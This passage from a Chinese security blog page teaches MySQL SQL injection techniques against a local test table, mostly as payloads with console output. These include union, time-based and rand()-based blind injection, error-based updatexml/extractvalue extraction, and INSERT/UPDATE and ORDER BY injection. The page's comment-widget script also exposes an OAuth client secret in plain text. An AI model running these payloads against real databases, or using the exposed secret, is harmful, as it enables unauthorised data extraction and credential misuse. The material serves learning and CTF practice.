++----+----------+-------+----------+
+|  1 | 2        |     3 | 1        |
+|  2 | asd      | 10000 | 123      |
+|  1 | user     | 10000 | user     |
++----+----------+-------+----------+
+3 rows in set (0.00 sec)
+
+mysql> select * from user where username='' or 1 union select 1,2,3,'2' order by 4;
++----+----------+-------+----------+
+| id | username | money | password |
++----+----------+-------+----------+
+|  2 | asd      | 10000 | 123      |
+|  1 | 2        |     3 | 2        |
+|  1 | user     | 10000 | user     |
++----+----------+-------+----------+
+3 rows in set (0.00 sec)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这样就能盲注出你想要的数据。（不太实用）</p>
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>时间盲注一般用于页面无回显不同，只能通过响应时间来判断真假。<br>常用构造：</p>
+<pre><code>if((bool),sleep(3),0)
+or (case when (bool) then sleep(3) else 0 end)
+
+&#39;or if((bool),(select BENCHMARK(10000000,md5(&#39;a&#39;))),1)--//bool为真时延时
+
+&#39; or if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)#//%d是占位符，笛卡尔积来进行延时注入
+
+</code></pre><h3 id="insert-amp-update注入"><a href="#insert-amp-update注入" class="headerlink" title="insert&amp;update注入"></a>insert&amp;update注入</h3><p>insert和update一般用报错注入</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> insert into user values('2','1' and updatexml(1,concat(0x7e,substr((database()),1,32),0x7e),1));
+ERROR 1105 (HY000): XPATH syntax error: '~csrf~'
+
+mysql> update user set username=''and updatexml(1,concat(0x7e,substr((database()),1,32),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: '~csrf~'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果没有错误回显，insert可以用时间盲注。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> insert into user values('4','1','2','1' and sleep(3));//列数与表列数相同
+Query OK, 1 row affected (3.00 sec)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>update 可以使用布尔盲注和时间盲注。</p>
+<p>如果存在insert和uodate更新后的数据可见的话，可以利用mysql中字符串与数字运算时被当成0进行运算。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select 'aaa1'+1;
++----------+
+| 'aaa1'+1 |
++----------+
+|        1 |
++----------+
+1 row in set, 1 warning (0.00 sec)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们可以利用查询的数据转化为10进制,然后进行运算,拿到我们计算的结果,在进行转化回去即可（一般六位一转，因为七位数太大会被mysql自动进行科学计数法存储，导致数据不准确，无法进行还原）</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> update user set password=''+conv(hex(substr(user(),1+(1-1)*6,6)),16,10);
+ERROR 1582 (42000): Incorrect parameter count in the call to native function 'hex'
+mysql> update user set password=''+conv(hex(substr(user(),1,6)),16,10);
+Query OK, 1 row affected (0.09 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+mysql> select  * from user;
++----+----------+-------+-----------------+
+| id | username | money | password        |
++----+----------+-------+-----------------+
+|  1 | user     |     0 | 125822936825964 |
++----+----------+-------+-----------------+
+1 row in set (0.00 sec)
+
+mysql> select  unhex(conv(125822936825964,10,16));
++------------------------------------+
+| unhex(conv(125822936825964,10,16)) |
++------------------------------------+
+| root@l                             |
++------------------------------------+
+1 row in set (0.09 sec)
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select * from user order by 1 and extractvalue(1, concat(0x7e, (select user()),0x7e));
+ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h5 id="基于if-盲注"><a href="#基于if-盲注" class="headerlink" title="基于if()盲注"></a>基于if()盲注</h5><p>order by的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。<br>需要列名的方法：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">order by if((bool),id,username)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里如果使用数字代替列名是不行的，因为if语句返回的是字符类型，不是整型。</p>
+<p>不需要知道列名的方法：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">order by if((bool),1,(select id from information_schema.tables))
+
+order by IF((bool),1,(select 1 union select 2))
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面</p>
+<h5 id="基于rand的盲注"><a href="#基于rand的盲注" class="headerlink" title="基于rand的盲注"></a>基于rand的盲注</h5><pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select * from ha order by rand(true);
++----+------+
+| id | name |
++----+------+
+|  9 | NULL |
+|  6 | NULL |
+|  5 | NULL |
+|  1 | dss  |
+|  0 | dasd |
++----+------+
+mysql> select * from ha order by rand(false);
++----+------+
+| id | name |
++----+------+
+|  1 | dss  |
+|  6 | NULL |
+|  0 | dasd |
+|  5 | NULL |
+|  9 | NULL |
++----+------+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到当rand()为true和false时，排序结果是不同的，所以就可以使用rang()函数进行盲注了。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">order by rand(ascii(mid((select database()),1,1))>32)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">order by IF(1,sleep(3),0);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>延迟时间=sleep(1)的秒数*所查询数据条数。<br>在写脚本时，可以添加timeout这一参数来避免延迟时间过长这一情况。</p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/images/post-cover/26.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+			<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	<ul>
+		
+				<li>
+					<div>
+						<a href="/2018/08/08/linux查看系统信息/" title="linux查看系统信息">
+							linux查看系统信息
+						</a>
+						<p>
+							linux系统下经常查看各种信息，总结一下。
+系统uname -a               # 查看内核/操作系统/CPU信息
+head -n 1 /etc/issue   # 查看操作系统版本
+cat /etc/issue | ...
+						</p>
+					</div>
+
+					<a href="/2018/08/08/linux查看系统信息/" title="linux查看系统信息">				
+						<img src="/images/post-cover/29.jpg" class="relateImg" alt="linux查看系统信息">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">
+							2019ddctfwriteup
+						</a>
+						<p>
+							
+						</p>
+					</div>
+
+					<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">				
+						<img src="/img/cart_cover.jpg" class="relateImg" alt="2019ddctfwriteup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">
+							2019掘安杯writeup
+						</a>
+						<p>
+							web部分下载下载与以前见到bugku的题差不多。
+提示：flag.php
+然后下载文件：http://120.79.1.69:10002/?file=flag.php即可得到文件：
+&lt;?php
+header('Content-...
+						</p>
+					</div>
+
+					<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">				
+						<img src="/images/post-cover/21.jpg" class="relateImg" alt="2019掘安杯writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/08/php-create-function-代码注入/" title="php create_function()代码注入">
+							php create_function()代码注入
+						</a>
+						<p>
+							create_function代码注入string create_function(string $args , string $code)
+$args 变量部分
+$code 方法代码部分
+返回值：以字符串形式返回唯一的函数名，如果出...
+						</p>
+					</div>
+
+					<a href="/2019/04/08/php-create-function-代码注入/" title="php create_function()代码注入">				
+						<img src="/images/post-cover/20.jpg" class="relateImg" alt="php create_function()代码注入">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/01/2019年上海嘉韦思杯writeup/" title="2019年上海嘉韦思杯writeup">
+							2019年上海嘉韦思杯writeup
+						</a>
+						<p>
+							1土肥原贤二报错注入
+1’ and updatexml(1,concat(0x7e,(database()),0x7e),1)#
+
+然后注表1’ and updatexml(1,concat(0x7e,(select group_co...
+						</p>
+					</div>
+
+					<a href="/2019/04/01/2019年上海嘉韦思杯writeup/" title="2019年上海嘉韦思杯writeup">				
+						<img src="/images/post-cover/14.jpg" class="relateImg" alt="2019年上海嘉韦思杯writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/03/26/nmap的使用/" title="nmap的使用">
+							nmap的使用
+						</a>
+						<p>
+							前言端口范围：1-65535
+常见的端口以及服务：
+
+21 — ftp协议
+22 — ssh远程登陆端口(linux)
+23 — telnet协议
+25 — 邮箱协议 smtp 发送邮件
+110 — pop3协议 接收邮件
+80 — ...
+						</p>
+					</div>
+
+					<a href="/2019/03/26/nmap的使用/" title="nmap的使用">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="nmap的使用">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/03/17/xss的绕过和利用/" title="xss的绕过和利用">
+							xss的绕过和利用
+						</a>
+						<p>
+							xssXSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给...
+						</p>
+					</div>
+
+					<a href="/2019/03/17/xss的绕过和利用/" title="xss的绕过和利用">				
+						<img src="/images/post-cover/19.jpg" class="relateImg" alt="xss的绕过和利用">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2018/12/10/ctf中web的常见知识点/" title="ctf中web的常见知识点">
+							ctf中web的常见知识点
+						</a>
+						<p>
+							本地访问和伪造ipX-Forwarded-For: 127.0.0.1
+域名解析可以更改HTTP头部host字段为flag.bugku.com
+把 flag.bugku.com 解析到120.24.86.145
+直接在
+c:\wind...
+						</p>
+					</div>
+
+					<a href="/2018/12/10/ctf中web的常见知识点/" title="ctf中web的常见知识点">				
+						<img src="/images/post-cover/9.jpg" class="relateImg" alt="ctf中web的常见知识点">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2018/12/04/2018安恒杯好黑的黑名单/" title="2018安恒杯好黑的黑名单">
+							2018安恒杯好黑的黑名单
+						</a>
+						<p>
+							  emmm，这个题是个好题。本题考察sql注入。绕过方法是以前没有遇见过的。里面利用了betwee  and  的特性。
+  尝试对其进行注入，发现明显的过滤。一旦关键字在黑名单里，就会有：这么坏？想让我下面给你吃吗？XD 的字样。...
+						</p>
+					</div>
+
+					<a href="/2018/12/04/2018安恒杯好黑的黑名单/" title="2018安恒杯好黑的黑名单">				
+						<img src="/images/post-cover/15.jpg" class="relateImg" alt="2018安恒杯好黑的黑名单">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2018/11/28/十大挖矿神器/" title="十大挖矿神器">
+							十大挖矿神器
+						</a>
+						<p>
+							十大挖洞必备神器
+0x00 Burp Suite
+
+
+Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。
+也就是说，Burp Suite是web应用...
+						</p>
+					</div>
+
+					<a href="/2018/11/28/十大挖矿神器/" title="十大挖矿神器">				
+						<img src="/images/post-cover/16.jpg" class="relateImg" alt="十大挖矿神器">
+					</a>
+				</li>											
+		
+		
+	</ul>
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//Thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//Remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//Create gitalk
+	var gitalk = new Gitalk({
+		clientID: 'b7a5e9f0853539dc3363',
+		clientSecret: '3cd61bd5dfe5ddffe1c91e4392ca95874aade540',
+		//id: window.location.pathname,
+		//id: decodeURI(window.location.pathname),
+		//id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+		repo: 'blog-Comment-Repo',
+		owner: 'ab-Alex',
+		admin: 'ab-Alex',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+
+		
+		
+	
+
+</div>
+			</div>
+		</div>	
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+
+	<script>
+		var appid = 'dXz',
+            appkey = 'wzG';	  
+        AnnieLeancloud(appid, appkey);         
+	</script>
+    
+
+
+ 
+
+<!-- show math formula -->
+
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
+
+
+<script>
+	//Refer to https://xinyo.org/archives/66226, thanks xinyo!
+	function codeCopy() {
+		var copyContainerId = 'copy-nav';
+						
+		$("pre").before(" <nav class=' " + copyContainerId + " '><i class='code-language'></i></nav> ");
+		
+		$('.' + copyContainerId).append("<i class='fa fa-clipboard copy-btn' aria-hidden='true'></i>");
+		
+		$('#article-content').find('pre').each( function () {
+			var language = $(this).children('code').attr('class').substr(9);//why 9? Need to check language?
+			$(this).prev().find('.code-language').text( language );	
+		});
+				
+		//为复制按钮添加click事件
+		$('.copy-btn').on("click", function() {
+			//初始化
+			$("textarea").remove("#targetId");
+			
+			//获取对应的代码
+			var codePre = $(this).parent().next(),
+				codeText = codePre[0].textContent,
+				target = document.createElement("textarea");
+			target.style.position = "absolute";
+			target.style.left = "-9999px";
+			target.style.top = "0";
+			target.id = "targetId";
+			codePre.append(target);
+			target.textContent = codeText;
+
+			//选中textarea内的代码
+			target.focus();
+			target.setSelectionRange(0, target.value.length);
+
+			// 复制选中的内容
+			document.execCommand("copy");
+			
+			//删除添加的节点
+			$("textarea").remove("#targetId");
+			
+			var thisCopied = $(this);
+			thisCopied.addClass('copy-status');	
+			setTimeout( function() {
+				thisCopied.removeClass('copy-status');
+			}, 2000)
+		});	
+	}
+	
+	if( $('.layout-post').length )	{
+		codeCopy();
+	}
+</script>
+
+
+<!-- TODO: There seems to be a bug when you close the post gallery! -->
+<link rel="stylesheet" href="/plugin/lightgallery/css/lightgallery.css">
+<script src="/plugin/lightgallery/js/jquery-1.11.0.min.js"></script>
+<script src="/plugin/lightgallery/js/lightgallery-all.min.js"></script>
+
+<script type="text/javascript">
+	var postTitle = $('.article-title a').text() ? $('.article-title a').text() : "No post title!";
+	$('.article-content img').each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		$(this).wrap('<div class="img-responsive" data-src="' + imgPath + '" data-responsive="' + imgPath + '" data-sub-html="<p>图片 ' + imgTitle + '</p><h4>文章' + postTitle + '</h4>"></div>');
+	});
+
+	$('.article-content').lightGallery({
+		mode: 'lg-slide',
+		selector: '.img-responsive',
+		share: false,
+		zoom: false,
+		download: false
+	});
+	//TODO：支持video
+</script>
+
+<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2019, content by Alex. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay. 					
+		</p>
+	</div>		
+</footer>
+		
+    <!-- set '1' to show motto in all pages! -->
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+    <!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      ESC
+   </span>
+		<div class="local-search-header">
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			
+
+   
+	<div id="topN"></div>
+	
+    <script>
+        var appid = 'dXz',
+            appkey = 'wzG',
+            limitCount = 10;
+        if( $('#topN').length ){
+            AV.initialize(appid, appkey);
+            var Counter = AV.Object.extend("Counter");  
+            topNPost(Counter, limitCount);
+        }
+    </script>
+   
+
+		</div>
+	</div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+    <script src="/js/love.js"></script>
+
+
+<!--back to top-->
+
+    
+	<div id="totop">
+  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
+	</div>
+	<div id="tobuttom">
+		<a href="javascript:;"  name="TOBUTTOM" class="fa fa-arrow-down" ></a>
+	</div>
+ 
+
+
+ 
+
+<script src="/js/vibrant.js"></script>
+<script src="/js/chinese.js"></script>
+<script src="/js/main.js"></script>
+	</body>
+	</html>
